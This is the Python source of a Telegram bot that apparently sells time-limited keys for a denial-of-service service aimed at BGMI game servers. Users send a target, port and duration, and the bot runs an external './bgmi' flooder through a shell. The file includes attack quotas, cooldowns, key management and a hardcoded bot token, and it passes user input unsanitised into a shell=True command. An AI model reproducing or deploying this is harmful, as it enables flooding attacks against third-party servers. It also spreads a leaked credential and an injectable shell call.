import os
import datetime
import subprocess
import time
from telebot import TeleBot
from requests.exceptions import ReadTimeout

# Admin user IDs
ADMIN_IDS = ["5113311276"]

# Verified group IDs
VERIFIED_GROUP_IDS = ["2208074827"]  # Replace with your group ID

# File to store allowed user IDs and keys with expiration dates
KEY_FILE = "keys.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Timeout for API requests
TIMEOUT = 130

# Bot initialization (replace 'YOUR_BOT_TOKEN' with your actual bot token)
bot = TeleBot('7598705419:AAG-Viaz5i5bdcMozeIPAk9X9AmAxrR_lbw')
# Constants for attack limits
MAX_ATTACKS_PER_DAY = 5

COOLDOWN_TIME = 2  # Cooldown time between attacks in seconds
# Function to read keys and their expiration dates from the file
def read_keys():
    allowed_keys = {}
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as file:
            for line in file:
                line = line.strip()
                if line:
                    try:
                        key, expiry_date = line.split(maxsplit=1)
                        allowed_keys[key] = datetime.datetime.strptime(expiry_date, "%Y-%m-%d").date()
                    except ValueError:
                        print(f"Ignoring invalid line in keys.txt: {line}")
    return allowed_keys

# List to store allowed keys
allowed_keys = read_keys()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared successfully"
    return "No logs found to clear."

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to send message with retries
def send_message_with_retry(chat_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.send_message(chat_id, text)
            break
        except ReadTimeout:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                bot.send_message(chat_id, "Failed to send message after several attempts.")

# Function to get group admins
def get_group_admins(chat_id):
    try:
        admins = bot.get_chat_administrators(chat_id)
        return [admin.user.id for admin in admins]
    except Exception as e:
        print(f"Error fetching group admins: {str(e)}")
        return []

# Function to check if user is admin
def is_user_admin(chat_id, user_id):
    if str(user_id) in ADMIN_IDS:
        return True
    group_admins = get_group_admins(chat_id)
    return user_id in group_admins

# Function to check if user has a valid key
def has_valid_key(user_id):
    return str(user_id) in allowed_keys

# Function to check if key is expired
def is_key_expired(user_id):
    today = datetime.date.today()
    expiry_date = allowed_keys.get(str(user_id))
    if expiry_date:
        expiry_date = datetime.datetime.strptime(expiry_date, "%Y-%m-%d").date()
        return today > expiry_date
    return True

# Function to track user attacks
user_attacks = {}

def track_attack(user_id):
    today = datetime.date.today()
    if user_id not in user_attacks:
        user_attacks[user_id] = {}
    if today not in user_attacks[user_id]:
        user_attacks[user_id][today] = 0
    user_attacks[user_id][today] += 1

def can_attack(user_id):
    today = datetime.date.today()
    if user_id in user_attacks and today in user_attacks[user_id]:
        return user_attacks[user_id][today] < MAX_ATTACKS_PER_DAY
    return True

# Command handlers
@bot.message_handler(commands=['addkey'])
def add_key(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split()
        if len(command) > 2:
            key_to_add = command[1]
            expiry_date = command[2]
            try:
                datetime.datetime.strptime(expiry_date, "%Y-%m-%d")
                if key_to_add not in allowed_keys:
                    allowed_keys[key_to_add] = expiry_date
                    with open(KEY_FILE, "a") as file:
                        file.write(f"{key_to_add} {expiry_date}\n")
                    response = f"Key {key_to_add} added successfully with expiry date {expiry_date}."
                else:
                    response = "Key already exists."
            except ValueError:
                response = "Invalid date format. Please use YYYY-MM-DD."
        else:
            response = "Please specify a key and an expiration date (YYYY-MM-DD) to add."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['removekey'])
def remove_key(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split()
        if len(command) > 1:
            key_to_remove = command[1]
            if key_to_remove in allowed_keys:
                del allowed_keys[key_to_remove]
                with open(KEY_FILE, "w") as file:
                    for key, expiry_date in allowed_keys.items():
                        file.write(f"{key} {expiry_date}\n")
                response = f"Key {key_to_remove} removed successfully."
            else:
                response = f"Key {key_to_remove} not found in the list."
        else:
            response = "Please specify a key to remove. Usage: /removekey <key>"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        response = clear_logs()
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['allkeys'])
def show_all_keys(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        if allowed_keys:
            response = "Authorized Keys and Expiration Dates:\n"
            for key, expiry_date in allowed_keys.items():
                response += f"- Key: {key}, Expires on: {expiry_date}\n"
        else:
            response = "No keys found."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found.")
        else:
            bot.reply_to(message, "No data found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {duration} Seconds\nMethod: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    is_admin = is_user_admin(message.chat.id, message.from_user.id)

    if user_id not in VERIFIED_GROUP_IDS and not (is_admin or has_valid_key(user_id)):
        bot.reply_to(message, "You need a valid key to use this command. Please activate by entering a valid key.")
        return

    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
        response = "You are on cooldown. Please wait before running the /bgmi command again."
        bot.reply_to(message, response)
        return

    if not is_admin and not can_attack(user_id):
        bot.reply_to(message, "You have reached the maximum number of attacks for today.")
        return

    bgmi_cooldown[user_id] = datetime.datetime.now()
    track_attack(user_id)
    
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        duration = int(command[3])
        if duration > 5000:
            response = "Error: Time interval must be less than 5000."
        else:
            record_command_logs(user_id, '/bgmi', target, port, duration)
            log_command(user_id, target, port, duration)
            start_attack_reply(message, target, port, duration)
            full_command = f"./bgmi {target} {port} {duration} 200"
            subprocess.run(full_command, shell=True)
            response = f"BGMI attack finished. Target: {target} Port: {port} Time: {duration}"
    else:
        response = "Usage: /bgmi <target> <port> <time>"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if has_valid_key(user_id) or is_user_admin(message.chat.id, message.from_user.id):
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        help_text = '''Admin commands:
/addkey <key> <expiry_date>: Add a key with expiration date (YYYY-MM-DD).
/removekey <key>: Remove a key.
/allkeys: Authorized keys list.
/logs: All users logs.
/broadcast: Broadcast a message.
/clearlogs: Clear the logs file.
'''
        bot.reply_to(message, help_text)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message to all users by admin:\n\n" + command[1]
            with open(KEY_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        send_message_with_retry(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['activate'])
def activate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        key_to_activate = command[1]
        if key_to_activate in allowed_keys and not is_key_expired(key_to_activate):
            allowed_keys[user_id] = allowed_keys[key_to_activate]
            with open(KEY_FILE, "w") as file:
                for key, expiry_date in allowed_keys.items():
                    file.write(f"{key} {expiry_date}\n")
            response = "Your key has been activated successfully."
        else:
            response = "Invalid or expired key."
    else:
        response = "Usage: /activate <key>"
    bot.reply_to(message, response)

bot.polling(none_stop=True, timeout=TIMEOUT)
